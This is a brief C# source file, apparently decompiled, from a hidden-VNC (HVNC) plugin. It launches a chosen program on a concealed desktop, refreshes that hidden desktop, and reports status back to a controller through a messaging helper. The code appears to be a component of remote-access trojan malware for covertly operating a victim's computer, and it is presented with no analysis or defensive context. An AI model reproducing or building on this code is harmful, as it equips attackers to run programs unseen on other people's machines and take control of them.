using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using HVNC;

namespace S.OpenApp
{
	// Token: 0x0200000C RID: 12
	internal class CustomOpen
	{
		// Token: 0x06000055 RID: 85 RVA: 0x00003AB0 File Offset: 0x00001CB0
		public static void Open(string Filename, string Args)
		{
			try
			{
				bool flag = !File.Exists(Filename);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("CustomOpen: Not Found! ''" + Filename + "''");
				}
				else
				{
					HideDesktop.CreateProcess(Filename + " " + Args, Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG(Filename + " : Running");
					Thread.Sleep(3000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("CustomOpen: " + ex.Message);
			}
		}
	}
}
